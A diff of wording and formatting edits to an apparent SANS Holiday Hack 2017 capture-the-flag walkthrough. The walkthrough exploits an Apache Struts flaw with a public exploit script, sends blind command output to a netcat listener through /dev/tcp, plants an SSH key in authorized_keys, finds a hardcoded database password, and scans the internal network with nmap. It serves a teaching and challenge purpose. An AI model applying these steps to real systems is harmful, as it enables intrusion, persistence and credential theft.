@@ -123,7 +123,7 @@ PORT     STATE  SERVICE
 3389/tcp closed ms-wbt-server
 #+END_SRC
 
-We can see that dev and l2s are one in the same. Visiting the dev page has a footer
+We can see that dev and l2s are one and the same, which is important, since dev was not explicitly called out as being in scope. Visiting the dev page has a footer
 that simply states =Powered By: Apache Struts=. Let's use this to our advantage.
 Let's use the tool provided through the SANS Pentest blog,
 [[https://github.com/chrisjd20/cve-2017-9805.py][cve-2017-9805.py]]. The dev page
@@ -162,12 +162,12 @@ doing by uncommenting the following line:
 print request.text
 #+END_SRC
 
-Performing the same simple command above results in a lengthy Apache Tomcat
-error with no apparent output from our =ls= command. We're dealing with a
-blind injection so we'll need to figure out a different way to get the output
-of the command. One trick we can pull is redirecting output to a special
-pseudo device, ~/dev/tcp/$host/$port~. First we'll need to set up a listener
-on our end first:
+Rerunning our command now results in a lengthy Apache Tomcat error
+with no apparent output from our =ls= command. We're dealing with a
+blind injection so we'll need to figure out a different way to get the
+output of the command. One trick we can pull is redirecting output to
+a special pseudo device, ~/dev/tcp/$host/$port~. We'll need to
+set up a listener on our end first:
 
 #+BEGIN_SRC
 holiday@hack:~$ nc -l -p 8888
@@ -294,7 +294,7 @@ cleartext in that file. We used =find= to =grep= all the files for
 *** Add an authorized_key
 
 One thing you can do if you don't have the password yet is actually
-add an ssh key to alabaster's authorized keys file. This is
+add an SSH key to Alabaster's authorized keys file. This is
 problematic since you need to know that the username is actually
 =alabaster_snowball= first. Assuming you do, you can run the following
 command to add your key to the file.
@@ -331,7 +331,7 @@ then we'll add our key:
   'echo ssh-rsa VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo= holiday@hack | tee -a /home/alabaster_snowball/.ssh/authorized_keys'
 #+END_SRC
 
-Then you can ssh using your private key identity file.
+Then you can SSH in using your private key identity file.
 
 #+BEGIN_SRC
 holiday@hack:~$ ssh -i /home/holiday/.ssh/sans_2017 alabaster_snowball@l2s.northpolechristmastown.com
@@ -340,8 +340,8 @@ alabaster_snowball@l2s:/tmp/asnow.xq1pCkwT7LUy3iLl0AaBCc7D$ grep -A1 -R / -e ala
 /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class- final String password = "stream_unhappy_buy_loss";
 #+END_SRC
 
-Once in you are in a restricted shell but you can try to grep for
-alabaster's password but a regular grep against the entire system will
+Once in you are in a restricted shell but you can try to =grep= for
+Alabaster's password but a regular =grep= against the entire system will
 take about 1 minute then you have to parse through the results.
 
 *** Automate the webshell
@@ -442,11 +442,11 @@ Linux hhc17-apache-struts1 4.9.0-5-amd64 #1 SMP Debian 4.9.65-3+deb9u2 (2018-01-
 
 *** Search even faster with ripgrep
 
-Ripgrep is a super fast grep replacement written in rust. It does a
+=ripgrep= is a super fast =grep= replacement written in rust. It does a
 better job at filtering binary files, so we can run this command that
 finishes in about a second.
 
-The following steps create a folder for ripgrep and executes the
+The following steps create a folder for =ripgrep= and executes the
 search.
 
 #+BEGIN_SRC sh
@@ -493,16 +493,16 @@ if ($_POST["first_name"] && $_POST["age"] && $_POST["state"] && $_POST["city"] &
    :CUSTOM_ID: q2_about-the-challenge
    :END:
 
-Initially the host has a couple of noticeable holes.
+Initially the host had a couple of noticeable holes.
 
-  * Apache server running as alabaster (eventually changed to www-data user)
-  * Easy bypass of rbash by adding the '-t' flag and executing bash on ssh login (eventually rbash was forced through sshd_config)
+  * Apache server running as =alabaster_snowball= (eventually changed to =www-data= user)
+  * Easy bypass of rbash by adding the '-t' flag and executing =bash= on SSH login (eventually =rbash= was forced through =/etc/ssh/sshd_config=)
 
-The server itself housed two virtual web hosts, the Letter's to Santa application which ran PHP in nginx and the Development site which was run by Apache struts on a high port being redirected by nginx.
+The server itself housed two virtual web hosts, the Letters to Santa application which ran PHP in =nginx= and the Development site which was run by Apache Struts on a high port being redirected by =nginx=.
 
 * Moving Foward
 
-Now that we have a script to automate access to l2s let's run nmap to scan the internal network.
+Now that we have a script to automate access to l2s let's run =nmap= to scan the internal network.
 
 #+BEGIN_SRC
 holiday@hack:~$ ./l2s.py "nmap -sC 10.142.0.*"
